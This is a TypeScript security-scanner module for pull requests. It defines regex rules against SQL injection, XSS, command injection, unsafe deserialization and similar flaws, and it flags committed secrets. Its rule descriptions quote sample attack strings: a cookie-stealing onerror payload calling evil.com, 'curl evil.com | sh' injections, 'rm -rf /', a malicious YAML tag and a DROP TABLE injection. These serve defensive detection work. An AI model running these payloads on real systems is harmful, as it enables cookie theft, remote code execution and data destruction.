import { ChangedFile, Finding } from "../types";
import {
  extractAddedLines,
  isCommentLine,
  isJSLike,
  isPython,
  isTestFile,
  isConfigFile,
  stripComment,
} from "./utils";

interface Rule {
  id: string;
  pattern: RegExp;
  title: string;
  description: string;
  severity: Finding["severity"];
  suggestion: string;
  languages?: ("javascript" | "typescript" | "python" | "any")[];
  skipTests?: boolean;
}

const RULES: Rule[] = [
  // ──────────────── Injection ────────────────
  {
    id: "sql-injection-concat",
    pattern: /(?:SELECT|INSERT|UPDATE|DELETE|DROP|ALTER)\s+.*(?:\+\s*\w|\$\{)/i,
    title: "SQL injection — query built with string concatenation or interpolation",
    description:
      "This line constructs a SQL query by concatenating or interpolating variables directly " +
      "into the query string. An attacker who controls the variable's value can inject arbitrary " +
      "SQL: reading other users' data, deleting tables, or bypassing authentication.\n\n" +
      "Real-world impact: SQL injection is consistently ranked OWASP #1. A single vulnerable " +
      "endpoint can expose your entire database. Attacks are automated — bots discover and " +
      "exploit these within hours of deployment.",
    severity: "critical",
    suggestion:
      "Use parameterized queries with placeholders:\n" +
      "• Node.js: `db.query('SELECT * FROM users WHERE id = ?', [userId])`\n" +
      "• Python: `cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))`\n" +
      "• ORMs (Prisma, SQLAlchemy, Django ORM) handle this automatically.\n" +
      "NEVER build SQL strings with `+`, template literals, or f-strings.",
  },
  {
    id: "sql-fstring",
    pattern: /f['"].*(?:SELECT|INSERT|UPDATE|DELETE|DROP)\b/i,
    title: "SQL query built with Python f-string — injection vector",
    description:
      "Building SQL with f-strings means user-controlled values are inserted directly into the " +
      "query text. An input like `'; DROP TABLE users; --` executes arbitrary SQL. " +
      "No amount of input validation is reliable — parameterized queries are the only safe approach.",
    severity: "critical",
    suggestion:
      "Use parameterized queries: `cursor.execute('SELECT * FROM users WHERE name = %s', (name,))`. " +
      "Or use an ORM like SQLAlchemy or Django ORM.",
    languages: ["python"],
  },
  {
    id: "sql-template-literal",
    pattern: /`[^`]*(?:SELECT|INSERT|UPDATE|DELETE|DROP)\b[^`]*\$\{/i,
    title: "SQL query built with template literal — injection vector",
    description:
      "Template literals (`...${var}...`) interpolate values directly into the SQL string. " +
      "This is functionally identical to string concatenation — any user-controlled value " +
      "in the template can execute arbitrary SQL.",
    severity: "critical",
    suggestion:
      "Use parameterized queries:\n" +
      "```\nconst result = await db.query('SELECT * FROM users WHERE id = $1', [userId]);\n```\n" +
      "With Prisma: `prisma.user.findUnique({ where: { id: userId } })`",
    languages: ["javascript", "typescript"],
  },

  // ──────────────── XSS ────────────────
  {
    id: "innerhtml",
    pattern: /\.innerHTML\s*=(?!=)/,
    title: "Direct innerHTML assignment — cross-site scripting (XSS) vector",
    description:
      "Setting `.innerHTML` parses the assigned string as HTML and executes any `<script>` tags " +
      "or event handlers (`onerror`, `onload`) within it. If the value contains anything from " +
      "user input, URL parameters, or API responses, an attacker can inject:\n" +
      "`<img onerror=\"fetch('https://evil.com/steal?cookie='+document.cookie)\" src=x>`\n\n" +
      "This runs in the victim's browser session with full access to cookies, localStorage, and the DOM.",
    severity: "high",
    suggestion:
      "Use `.textContent` for plain text. If you need HTML rendering, sanitize with DOMPurify:\n" +
      "```\nelement.innerHTML = DOMPurify.sanitize(userInput);\n```\n" +
      "In React, avoid `dangerouslySetInnerHTML` — use JSX which auto-escapes.",
    languages: ["javascript", "typescript"],
  },
  {
    id: "dangerous-set-innerhtml",
    pattern: /dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:/,
    title: "React dangerouslySetInnerHTML — XSS risk if input isn't sanitized",
    description:
      "React's `dangerouslySetInnerHTML` bypasses React's automatic XSS protection. If the " +
      "`__html` value contains unsanitized user input, it creates the same XSS vulnerability " +
      "as raw innerHTML. React named it 'dangerously' as a warning — it should be treated as a " +
      "red flag in code review.",
    severity: "high",
    suggestion:
      "Sanitize with DOMPurify before rendering:\n" +
      "```\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(htmlContent) }} />\n```\n" +
      "Better: use a markdown renderer or rich-text component that handles sanitization internally.",
    languages: ["javascript", "typescript"],
  },
  {
    id: "document-write",
    pattern: /document\.write\s*\(/,
    title: "document.write() — XSS vector and performance anti-pattern",
    description:
      "document.write() inserts raw HTML into the page during parsing. It has two problems:\n" +
      "1. **Security**: If called with user input, it's an XSS vector identical to innerHTML.\n" +
      "2. **Performance**: If called after the page loads, it wipes the entire page. During " +
      "loading, it blocks HTML parsing. Chrome actively intervenes against cross-origin " +
      "document.write() scripts on slow connections.",
    severity: "high",
    suggestion: "Use DOM APIs: `document.createElement()`, `element.appendChild()`, or a framework.",
    languages: ["javascript", "typescript"],
  },

  // ──────────────── Command injection ────────────────
  {
    id: "command-injection-python",
    pattern: /(?:os\.system|os\.popen|subprocess\.call|subprocess\.Popen|subprocess\.run)\s*\([^)]*(?:\+|%|\.format|f['"])/,
    title: "Shell command built with string interpolation — command injection",
    description:
      "This constructs a shell command by concatenating or formatting user-controlled input. " +
      "An attacker can inject shell metacharacters: an input like `; rm -rf /` or " +
      "`$(curl evil.com | sh)` will execute arbitrary commands with the same privileges " +
      "as your application process.\n\n" +
      "This is especially dangerous in web apps and CI/CD pipelines where the process often " +
      "runs with elevated permissions.",
    severity: "critical",
    suggestion:
      "Use `subprocess.run()` with a list of arguments (no shell expansion):\n" +
      "```python\nsubprocess.run(['git', 'clone', repo_url], check=True)\n```\n" +
      "Never use `shell=True` with user input. For complex commands, use the `shlex.quote()` " +
      "function to escape individual arguments.",
    languages: ["python"],
  },
  {
    id: "command-injection-js",
    pattern: /(?:exec|execSync|spawn|spawnSync)\s*\(\s*(?:`[^`]*\$\{|['"][^'"]*\+)/,
    title: "Shell command built with string interpolation — command injection",
    description:
      "Building shell commands with template literals or concatenation allows injection of " +
      "shell metacharacters. An input containing `; curl evil.com | sh` or backticks will " +
      "execute arbitrary commands on your server.",
    severity: "critical",
    suggestion:
      "Use `execFile()` or `spawn()` with argument arrays instead of `exec()`:\n" +
      "```\nchild_process.execFile('git', ['clone', repoUrl]);\n```\n" +
      "`execFile` doesn't invoke a shell, so metacharacters are treated as literal strings.",
    languages: ["javascript", "typescript"],
  },

  // ──────────────── Deserialization ────────────────
  {
    id: "pickle-load",
    pattern: /pickle\.loads?\s*\(/,
    title: "pickle.load — arbitrary code execution during deserialization",
    description:
      "Python's `pickle` format can encode arbitrary Python objects, including objects with " +
      "custom `__reduce__` methods that execute code on load. Loading a pickle from an untrusted " +
      "source (user upload, API, queue, cache) gives the attacker full code execution on your server.\n\n" +
      "This isn't a theoretical risk — pickle-based RCE is a standard penetration testing technique.",
    severity: "critical",
    suggestion:
      "Use JSON for data exchange — it can only encode safe primitive types. If you need " +
      "Python-specific serialization, use `jsonpickle` with a whitelist, or `marshmallow` " +
      "for structured deserialization with schema validation.",
    languages: ["python"],
  },
  {
    id: "yaml-unsafe",
    pattern: /yaml\.load\s*\([^)]*\)(?!.*(?:Loader|safe_load))/,
    title: "yaml.load without SafeLoader — arbitrary code execution",
    description:
      "`yaml.load()` with the default loader can instantiate arbitrary Python objects from YAML " +
      "tags like `!!python/object/apply:os.system ['rm -rf /']`. A malicious YAML file can " +
      "execute any system command. This was the root cause of multiple CVEs across Python projects.",
    severity: "high",
    suggestion:
      "Use `yaml.safe_load()` which only loads basic types (strings, numbers, lists, dicts):\n" +
      "```python\ndata = yaml.safe_load(yaml_string)\n```\n" +
      "Or explicitly: `yaml.load(data, Loader=yaml.SafeLoader)`",
    languages: ["python"],
  },

  // ──────────────── SSL / Crypto ────────────────
  {
    id: "ssl-disabled",
    pattern: /verify\s*=\s*False/,
    title: "SSL/TLS certificate verification disabled — man-in-the-middle risk",
    description:
      "Setting `verify=False` in HTTP requests (typically `requests.get(url, verify=False)`) " +
      "disables certificate validation. This means the code will happily connect to a server " +
      "presenting a forged certificate — allowing attackers on the same network to intercept, " +
      "read, and modify all traffic (passwords, API keys, user data) in transit.",
    severity: "high",
    suggestion:
      "Remove `verify=False`. If you're hitting a server with a self-signed cert in development, " +
      "set the `REQUESTS_CA_BUNDLE` environment variable to point to your CA certificate. " +
      "Never disable verification in production.",
    languages: ["python"],
  },
  {
    id: "weak-hash",
    pattern: /\b(?:md5|sha1)\s*\(|(?:hashlib\.md5|hashlib\.sha1|crypto\.createHash\s*\(\s*['"](?:md5|sha1)['"])\b/i,
    title: "Weak hash algorithm (MD5/SHA1) — broken for security use",
    description:
      "MD5 and SHA1 have known collision attacks: an attacker can generate two different inputs " +
      "that produce the same hash. For passwords, both are trivially brute-forced (billions of " +
      "hashes per second on a GPU). MD5 collision attacks have been demonstrated since 2004; " +
      "SHA1 since 2017 (SHAttered attack by Google).\n\n" +
      "Using these for checksums of non-security data (like cache keys) is fine — only security-sensitive " +
      "use (passwords, signatures, tokens) is the concern.",
    severity: "medium",
    suggestion:
      "For passwords: use `bcrypt`, `argon2`, or `scrypt` — they're intentionally slow.\n" +
      "For signatures/integrity: use SHA-256 or SHA-3.\n" +
      "For content-addressable caching: MD5 is still acceptable.",
  },

  // ──────────────── Access control ────────────────
  {
    id: "cors-wildcard",
    pattern: /(?:Access-Control-Allow-Origin|cors)\s*(?::\s*|.*)\*/i,
    title: "Wildcard CORS policy — any website can make API requests",
    description:
      "Setting `Access-Control-Allow-Origin: *` allows ANY website to make requests to your API " +
      "from a user's browser. If your API returns sensitive data or performs actions, a malicious " +
      "site can use a logged-in user's session cookies to read data or trigger actions via " +
      "cross-origin requests.",
    severity: "medium",
    suggestion:
      "Restrict to your own domains: `Access-Control-Allow-Origin: https://app.yourdomain.com`. " +
      "For public APIs that don't use cookies, wildcard is acceptable — but add this as an explicit comment.",
  },
  {
    id: "chmod-777",
    pattern: /chmod\s+777/,
    title: "chmod 777 — world-readable, writable, and executable",
    description:
      "Permission 777 means every user on the system can read, write, and execute the file. " +
      "On a shared server or container, this means other processes, compromised services, " +
      "or container escape attacks can modify your executables, config files, or data. " +
      "In Docker, this is especially risky because containers often run as root.",
    severity: "high",
    suggestion:
      "Use minimal permissions:\n" +
      "• `644` for regular files (owner rw, group/other read-only)\n" +
      "• `755` for executables and directories (owner rwx, group/other read+execute)\n" +
      "• `600` for secret files (owner-only read/write)",
  },

  // ──────────────── Insecure transport ────────────────
  {
    id: "http-url",
    pattern: /['"]http:\/\/(?!localhost|127\.0\.0\.1|0\.0\.0\.0|10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.)[\w.-]+/i,
    title: "Hardcoded HTTP URL — data transmitted in plaintext",
    description:
      "This URL uses `http://` instead of `https://`. All data sent over HTTP is visible to " +
      "anyone on the network path (ISPs, Wi-Fi sniffers, corporate proxies). This includes " +
      "request bodies, headers (with auth tokens), and response data. The URL excludes " +
      "localhost and private IPs, so this appears to be a public endpoint.",
    severity: "medium",
    suggestion:
      "Change to `https://`. All modern servers support HTTPS via free certificates (Let's Encrypt). " +
      "If the server genuinely doesn't support HTTPS, that's a red flag about the service itself.",
  },

  // ──────────────── File system ────────────────
  {
    id: "path-traversal",
    pattern: /(?:readFile|writeFile|createReadStream|open|unlink)\s*\([^)]*(?:\+|`\$\{|\.join\s*\()[^)]*(?:req\.|params\.|query\.|body\.)/,
    title: "Potential path traversal — user input in file path",
    description:
      "A file-system operation uses user-controlled input (from request params, query, or body) " +
      "in the file path. An attacker can use `../` sequences to escape the intended directory " +
      "and read/write arbitrary files: `../../etc/passwd`, `../../.env`, or overwrite application code.",
    severity: "critical",
    suggestion:
      "Validate and sanitize the path:\n" +
      "```\nconst safeName = path.basename(userInput); // strips directory traversal\nconst fullPath = path.join(UPLOAD_DIR, safeName);\n" +
      "if (!fullPath.startsWith(UPLOAD_DIR)) throw new Error('Path traversal');\n```",
    languages: ["javascript", "typescript"],
  },

  // ──────────────── Redirect ────────────────
  {
    id: "open-redirect",
    pattern: /(?:redirect|location\.href|window\.location)\s*=\s*(?:req\.|params\.|query\.|body\.|\w+\.(?:query|params))/,
    title: "Potential open redirect — user input controls redirect target",
    description:
      "The redirect URL is set from user-controlled input. An attacker can craft a link like " +
      "`https://yourapp.com/login?redirect=https://evil.com/phishing` that appears to be your " +
      "domain but redirects to a phishing page. Users see your domain in the link and trust it.",
    severity: "high",
    suggestion:
      "Validate the redirect URL against a whitelist of allowed domains, or only allow relative paths:\n" +
      "```\nconst url = new URL(redirectTarget, 'https://yourdomain.com');\n" +
      "if (url.origin !== 'https://yourdomain.com') throw new Error('Invalid redirect');\n```",
    languages: ["javascript", "typescript"],
  },

  // ──────────────── JWT / Auth ────────────────
  {
    id: "jwt-none-algorithm",
    pattern: /algorithm\s*[=:]\s*['"]none['"]/i,
    title: "JWT 'none' algorithm — authentication bypass",
    description:
      "Setting the JWT algorithm to 'none' means the token has no signature at all. An attacker " +
      "can forge any token with any claims (like `admin: true`) and it will be accepted as valid. " +
      "This is a well-known JWT attack that has led to authentication bypasses in production systems.",
    severity: "critical",
    suggestion:
      "Always specify a strong algorithm: `algorithm: 'HS256'` (symmetric) or `'RS256'` (asymmetric). " +
      "Reject tokens with algorithm 'none' in your verification logic.",
  },
];

export function analyzeSecurity(files: ChangedFile[]): Finding[] {
  const findings: Finding[] = [];

  for (const file of files) {
    if (file.status === "removed") continue;

    const isTest = isTestFile(file.filename);

    // Diff-level scanning
    if (file.patch) {
      const addedLines = extractAddedLines(file.patch);
      for (const { lineNumber, content } of addedLines) {
        if (isCommentLine(content, file.filename)) continue;
        if (!content.trim()) continue;

        const codePortion = stripComment(content, file.filename);

        for (const rule of RULES) {
          if (rule.skipTests && isTest) continue;

          if (rule.languages && !rule.languages.includes("any")) {
            const jsLike = isJSLike(file.filename);
            const py = isPython(file.filename);
            const langMatch = rule.languages.some(
              (l) =>
                l === "any" ||
                (l === "javascript" && jsLike) ||
                (l === "typescript" && jsLike) ||
                (l === "python" && py)
            );
            if (!langMatch) continue;
          }

          if (rule.pattern.test(codePortion)) {
            findings.push({
              title: rule.title,
              description: rule.description,
              severity: rule.severity,
              filePath: file.filename,
              lineNumber,
              codeSnippet: content.trim(),
              suggestion: rule.suggestion,
              category: "security",
            });
          }
        }
      }
    }

    // File-level checks (always apply, even to config-only files)
    if (/\.env(?:\.\w+)?$/.test(file.filename) && !file.filename.endsWith(".env.example")) {
      findings.push({
        title: "Environment file committed to repository",
        description:
          "An `.env` file is part of this PR. These files typically contain database credentials, " +
          "API keys, and other secrets. Once committed, secrets exist in git history permanently — " +
          "even if you delete the file later, anyone with repo access can recover it from history. " +
          "Automated scrapers also scan public repos for committed .env files.",
        severity: "critical",
        filePath: file.filename,
        codeSnippet: "",
        suggestion:
          "1. Add `.env*` to `.gitignore` (except `.env.example`)\n" +
          "2. Remove from git history: `git filter-branch` or BFG Repo-Cleaner\n" +
          "3. Rotate ALL credentials that were in the file — assume they're compromised\n" +
          "4. Use `.env.example` with placeholder values for documentation",
        category: "security",
      });
    }

    if (/\.(pem|key|p12|pfx|jks|keystore)$/.test(file.filename)) {
      findings.push({
        title: "Private key / certificate file committed to repository",
        description:
          "A private key or certificate file is part of this PR. Private keys in a repository " +
          "can be used to impersonate your server (TLS keys), decrypt traffic (SSL keys), " +
          "sign tokens (JWT keys), or access cloud resources (SSH keys). Like .env files, " +
          "they persist in git history even after deletion.",
        severity: "critical",
        filePath: file.filename,
        codeSnippet: "",
        suggestion:
          "1. Remove the file and add the extension to `.gitignore`\n" +
          "2. Rotate the key immediately — generate a new one and revoke the old\n" +
          "3. Clean git history with `git filter-branch` or BFG\n" +
          "4. Store keys in a secrets manager or encrypted vault",
        category: "security",
      });
    }

    if (/id_rsa|id_ed25519|id_ecdsa/.test(file.filename) && !file.filename.endsWith(".pub")) {
      findings.push({
        title: "SSH private key committed to repository",
        description:
          "An SSH private key file was committed. This key can be used to authenticate to any " +
          "server that trusts it — including production servers, CI/CD systems, and cloud VMs. " +
          "An attacker with this key can SSH into your infrastructure.",
        severity: "critical",
        filePath: file.filename,
        codeSnippet: "",
        suggestion:
          "Remove immediately, rotate the key pair, and remove from all `authorized_keys` files. " +
          "Use ssh-agent or a secrets manager for key distribution.",
        category: "security",
      });
    }
  }

  return findings;
}
